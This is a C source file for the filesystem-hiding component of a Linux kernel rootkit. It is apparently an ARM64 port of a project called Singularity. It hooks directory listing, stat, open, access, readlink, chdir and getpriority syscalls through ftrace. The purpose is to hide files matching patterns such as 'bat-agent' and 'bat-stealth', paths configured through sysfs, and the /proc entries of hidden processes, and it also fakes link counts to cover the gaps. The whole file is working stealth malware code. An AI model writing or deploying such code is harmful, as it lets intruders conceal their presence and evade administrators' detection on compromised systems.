/* hiding_fs.c — Filesystem-level hiding: directory entries, stat, open, chdir, readlink.
 *
 * Merged from Singularity:
 *   hiding_directory.c  — getdents64/getdents filtering
 *   hiding_stat.c       — stat/lstat/statx/newfstatat nlink adjustment
 *   open.c              — openat/access/faccessat proc path blocking
 *   hiding_chdir.c      — chdir blocking
 *   hiding_readlink.c   — readlink blocking
 *
 * Paths to hide:
 *   1. Static patterns: hidden_patterns[] in hiding_directory_def.h
 *   2. Dynamic: bat_hidden_paths[] configured via sysfs hide_path
 *   3. /proc/<hidden_pid>/... entries
 *
 * Port from Singularity:
 *   - ARCH_SYS() replaces __x64_sys_* in hook table
 *   - __ia32_* hooks removed (ARM64 has no ia32 compat layer)
 *   - REGS_ARGn macros replace direct register access
 *   - should_hide_path() extended to check bat_hidden_paths[]
 */
#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/pid_manager.h"
#include "../include/sysfs_iface.h"
#include "../include/hiding_directory_def.h"
#include "../include/hiding_fs.h"

#define PATH_BUF_SIZE 256

/* ════════════════════════════════════════════════════════════════
 * Path / name visibility predicates
 * ════════════════════════════════════════════════════════════════ */

notrace bool should_hide_path(const char __user *pathname)
{
    char buf[PATH_BUF_SIZE];
    long copied;
    int i, pid;

    if (!pathname)
        return false;

    memset(buf, 0, PATH_BUF_SIZE);
    copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
    if (copied < 0)
        return false;
    buf[PATH_BUF_SIZE - 1] = '\0';

    /* Static patterns (bat-agent, bat-stealth, .cache/systemd) */
    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(buf, hidden_patterns[i]))
            return true;
    }

    /* Dynamic paths added via sysfs hide_path */
    for (i = 0; i < bat_hidden_path_count; i++) {
        if (bat_hidden_paths[i][0] && strstr(buf, bat_hidden_paths[i]))
            return true;
    }

    /* /proc/<hidden_pid>[/...] */
    if (!strncmp(buf, "/proc/", 6)) {
        const char *after = buf + 6;
        char pid_buf[16]  = {0};
        int j = 0;

        while (j < (int)sizeof(pid_buf) - 1 &&
               after[j] && after[j] >= '0' && after[j] <= '9') {
            pid_buf[j] = after[j];
            j++;
        }
        pid_buf[j] = '\0';

        if (j > 0 && kstrtoint(pid_buf, 10, &pid) == 0)
            return is_hidden_pid(pid);
    }

    return false;
}

static notrace bool should_hide_name(const char *name)
{
    int i, pid;

    if (!name)
        return false;

    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(name, hidden_patterns[i]))
            return true;
    }

    for (i = 0; i < bat_hidden_path_count; i++) {
        if (bat_hidden_paths[i][0] && strstr(name, bat_hidden_paths[i]))
            return true;
    }

    if (kstrtoint(name, 10, &pid) == 0 && pid > 0)
        return is_hidden_pid(pid) || is_child_pid(pid);

    return false;
}

/* ════════════════════════════════════════════════════════════════
 * getdents64 / getdents — directory entry filtering
 * ════════════════════════════════════════════════════════════════ */

#ifndef HAVE_LINUX_DIRENT
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};
#endif

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static notrace long filter_dirents(void __user *user_dir, long n, bool is_64)
{
    char *kernel_buf, *filtered_buf;
    long offset = 0, new_offset = 0, result = n;

    if (n <= 0)
        return n;

    kernel_buf = kmalloc(n, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_dir, n)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    filtered_buf = kzalloc(n, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    while (offset < result) {
        char *curr_name;
        unsigned short reclen;
        void *curr_entry = kernel_buf + offset;

        if (is_64) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)curr_entry;
            curr_name = d->d_name;
            reclen    = d->d_reclen;
        } else {
            struct linux_dirent *d = (struct linux_dirent *)curr_entry;
            curr_name = d->d_name;
            reclen    = d->d_reclen;
        }

        if (!should_hide_name(curr_name)) {
            if (new_offset + reclen <= n) {
                memcpy(filtered_buf + new_offset, curr_entry, reclen);
                new_offset += reclen;
            }
        }
        offset += reclen;
    }

    if (copy_to_user(user_dir, filtered_buf, new_offset)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(filtered_buf);
    return new_offset;
}

static notrace asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long res = orig_getdents64(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)REGS_ARG1(regs), res, true);
}

static notrace asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    long res = orig_getdents(regs);
    if (res <= 0) return res;
    return filter_dirents((void __user *)REGS_ARG1(regs), res, false);
}

/* ════════════════════════════════════════════════════════════════
 * stat / lstat / statx / newfstatat — nlink adjustment
 * ════════════════════════════════════════════════════════════════ */

static notrace int count_hidden_subdirs(const char __user *pathname_user)
{
    char pathbuf[PATH_BUF_SIZE];
    char child[PATH_BUF_SIZE];
    long copied;
    int i, cnt = 0;
    struct path p;

    if (!pathname_user)
        return 0;

    copied = strncpy_from_user(pathbuf, pathname_user, PATH_BUF_SIZE - 1);
    if (copied <= 0)
        return 0;
    pathbuf[PATH_BUF_SIZE - 1] = '\0';

    if (pathbuf[0] && pathbuf[strlen(pathbuf) - 1] == '/')
        pathbuf[strlen(pathbuf) - 1] = '\0';

    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (snprintf(child, sizeof(child), "%s/%s", pathbuf, hidden_patterns[i])
                >= (int)sizeof(child))
            continue;
        if (kern_path(child, LOOKUP_FOLLOW, &p) == 0) {
            if (S_ISDIR(d_inode(p.dentry)->i_mode))
                cnt++;
            path_put(&p);
        }
    }

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] <= 0) continue;
        if (snprintf(child, sizeof(child), "%s/%d", pathbuf, hidden_pids[i])
                >= (int)sizeof(child))
            continue;
        if (kern_path(child, LOOKUP_FOLLOW, &p) == 0) {
            if (S_ISDIR(d_inode(p.dentry)->i_mode))
                cnt++;
            path_put(&p);
        }
    }

    return cnt;
}

static notrace void adjust_user_stat_nlink(const char __user *pathname_user,
                                            void __user *user_stat,
                                            size_t stat_size, bool is_statx)
{
    int hidden_cnt;

    if (!user_stat || !pathname_user)
        return;

    hidden_cnt = count_hidden_subdirs(pathname_user);
    if (hidden_cnt <= 0)
        return;

    if (is_statx) {
        struct statx kstx;
        if (copy_from_user(&kstx, user_stat, sizeof(kstx)))
            return;
        if (kstx.stx_nlink > (u64)hidden_cnt)
            kstx.stx_nlink -= (u64)hidden_cnt;
        else
            kstx.stx_nlink = 1;
        (void)copy_to_user(user_stat, &kstx, sizeof(kstx));
        return;
    }

    if (stat_size == sizeof(struct stat)) {
        struct stat kst;
        if (copy_from_user(&kst, user_stat, sizeof(kst)))
            return;
        if (kst.st_nlink > (unsigned long)hidden_cnt)
            kst.st_nlink -= (unsigned long)hidden_cnt;
        else
            kst.st_nlink = 1;
        (void)copy_to_user(user_stat, &kst, sizeof(kst));
    }
}

/* statx(dfd, pathname, flags, mask, buf) — buf = ARG4 */
static asmlinkage long (*orig_statx)(const struct pt_regs *);

static notrace asmlinkage long hook_statx(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    void __user *statbuf        = (void __user *)REGS_ARG4(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_statx(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, 0, true);
    return ret;
}

/* stat(pathname, statbuf) — statbuf = ARG1 */
static asmlinkage long (*orig_stat)(const struct pt_regs *);

static notrace asmlinkage long hook_stat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    void __user *statbuf        = (void __user *)REGS_ARG1(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_stat(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, sizeof(struct stat), false);
    return ret;
}

/* lstat(pathname, statbuf) */
static asmlinkage long (*orig_lstat)(const struct pt_regs *);

static notrace asmlinkage long hook_lstat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    void __user *statbuf        = (void __user *)REGS_ARG1(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_lstat(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, sizeof(struct stat), false);
    return ret;
}

/* newstat(pathname, statbuf) */
static asmlinkage long (*orig_newstat)(const struct pt_regs *);

static notrace asmlinkage long hook_newstat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    void __user *statbuf        = (void __user *)REGS_ARG1(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_newstat(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, sizeof(struct stat), false);
    return ret;
}

/* newlstat(pathname, statbuf) */
static asmlinkage long (*orig_newlstat)(const struct pt_regs *);

static notrace asmlinkage long hook_newlstat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    void __user *statbuf        = (void __user *)REGS_ARG1(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_newlstat(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, sizeof(struct stat), false);
    return ret;
}

/* newfstatat(dfd, pathname, statbuf, flag) — statbuf = ARG2 */
static asmlinkage long (*orig_newfstatat)(const struct pt_regs *);

static notrace asmlinkage long hook_newfstatat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    void __user *statbuf        = (void __user *)REGS_ARG2(regs);
    long ret;

    if (should_hide_path(pathname))
        return -ENOENT;

    ret = orig_newfstatat(regs);
    if (ret != 0) return ret;

    adjust_user_stat_nlink(pathname, statbuf, sizeof(struct stat), false);
    return ret;
}

/* getpriority(PRIO_PROCESS, pid) — hide pid */
static asmlinkage long (*orig_getpriority)(const struct pt_regs *);

static notrace asmlinkage long hook_getpriority(const struct pt_regs *regs)
{
    int which = (int)REGS_ARG0(regs);
    int who   = (int)REGS_ARG1(regs);

    if (which == PRIO_PROCESS && who > 0 && is_hidden_pid(who))
        return -ESRCH;

    return orig_getpriority(regs);
}

/* ════════════════════════════════════════════════════════════════
 * openat — block /proc/<hidden_pid>/... access
 * ════════════════════════════════════════════════════════════════ */

static notrace bool is_hidden_proc_path(const char __user *pathname)
{
    char buf[PATH_BUF_SIZE];
    long copied;
    char pid_buf[16] = {0};
    int i = 0, pid;

    if (!pathname)
        return false;

    memset(buf, 0, PATH_BUF_SIZE);
    copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
    if (copied < 0)
        return false;
    buf[PATH_BUF_SIZE - 1] = '\0';

    if (strncmp(buf, "/proc/", 6) != 0)
        return false;

    {
        const char *after = buf + 6;
        while (i < (int)sizeof(pid_buf) - 1 &&
               after[i] && after[i] != '/' &&
               after[i] >= '0' && after[i] <= '9') {
            pid_buf[i] = after[i];
            i++;
        }
        pid_buf[i] = '\0';
    }

    if (i == 0)
        return false;

    if (kstrtoint(pid_buf, 10, &pid) < 0)
        return false;

    return is_hidden_pid(pid);
}

/* openat(dfd, pathname, ...) — pathname = ARG1 */
static asmlinkage long (*orig_openat)(const struct pt_regs *);

static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_openat(regs);
}

/* readlinkat(dfd, pathname, ...) — pathname = ARG1 */
static asmlinkage long (*orig_readlinkat)(const struct pt_regs *);

static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_readlinkat(regs);
}

/* readlink(pathname, ...) — pathname = ARG0 */
static asmlinkage long (*orig_readlink)(const struct pt_regs *);

static notrace asmlinkage long hook_readlink(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_readlink(regs);
}

/* access(pathname, mode) — pathname = ARG0 */
static asmlinkage long (*orig_access)(const struct pt_regs *);

static notrace asmlinkage long hook_access(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_access(regs);
}

/* faccessat(dfd, pathname, mode) — pathname = ARG1 */
static asmlinkage long (*orig_faccessat)(const struct pt_regs *);

static notrace asmlinkage long hook_faccessat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_faccessat(regs);
}

/* faccessat2(dfd, pathname, mode, flags) — pathname = ARG1 */
static asmlinkage long (*orig_faccessat2)(const struct pt_regs *);

static notrace asmlinkage long hook_faccessat2(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG1(regs);
    if (should_hide_path(pathname) || is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_faccessat2(regs);
}

/* chdir(pathname) — pathname = ARG0 */
static asmlinkage long (*orig_chdir)(const struct pt_regs *);

static notrace asmlinkage long hook_chdir(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)REGS_ARG0(regs);
    if (should_hide_path(pathname))
        return -ENOENT;
    return orig_chdir(regs);
}

/* ════════════════════════════════════════════════════════════════
 * Hook table — ARCH_SYS resolves correct prefix per architecture
 * ════════════════════════════════════════════════════════════════ */

static struct ftrace_hook fs_hooks[] = {
    /* Directory listing */
    HOOK(ARCH_SYS("getdents64"),    hook_getdents64,    &orig_getdents64),
    HOOK(ARCH_SYS("getdents"),      hook_getdents,      &orig_getdents),
    /* Stat family */
    HOOK(ARCH_SYS("statx"),         hook_statx,         &orig_statx),
    HOOK(ARCH_SYS("stat"),          hook_stat,          &orig_stat),
    HOOK(ARCH_SYS("lstat"),         hook_lstat,         &orig_lstat),
    HOOK(ARCH_SYS("newstat"),       hook_newstat,       &orig_newstat),
    HOOK(ARCH_SYS("newlstat"),      hook_newlstat,      &orig_newlstat),
    HOOK(ARCH_SYS("newfstatat"),    hook_newfstatat,    &orig_newfstatat),
    HOOK(ARCH_SYS("getpriority"),   hook_getpriority,   &orig_getpriority),
    /* Open / access */
    HOOK(ARCH_SYS("openat"),        hook_openat,        &orig_openat),
    HOOK(ARCH_SYS("readlinkat"),    hook_readlinkat,    &orig_readlinkat),
    HOOK(ARCH_SYS("readlink"),      hook_readlink,      &orig_readlink),
    HOOK(ARCH_SYS("access"),        hook_access,        &orig_access),
    HOOK(ARCH_SYS("faccessat"),     hook_faccessat,     &orig_faccessat),
    HOOK(ARCH_SYS("faccessat2"),    hook_faccessat2,    &orig_faccessat2),
    /* chdir */
    HOOK(ARCH_SYS("chdir"),         hook_chdir,         &orig_chdir),
};

/* ════════════════════════════════════════════════════════════════
 * Init / Exit — non-fatal: some syscalls may not exist on all kernels
 * ════════════════════════════════════════════════════════════════ */

int hiding_fs_init(void)
{
    int i, installed = 0;

    for (i = 0; i < (int)ARRAY_SIZE(fs_hooks); i++) {
        if (fh_install_hook(&fs_hooks[i]) == 0)
            installed++;
    }

    /* Require at least getdents64 and openat */
    return (installed >= 2) ? 0 : -ENOENT;
}

void hiding_fs_exit(void)
{
    int i;
    for (i = (int)ARRAY_SIZE(fs_hooks) - 1; i >= 0; i--) {
        if (fs_hooks[i].address)
            fh_remove_hook(&fs_hooks[i]);
    }
}
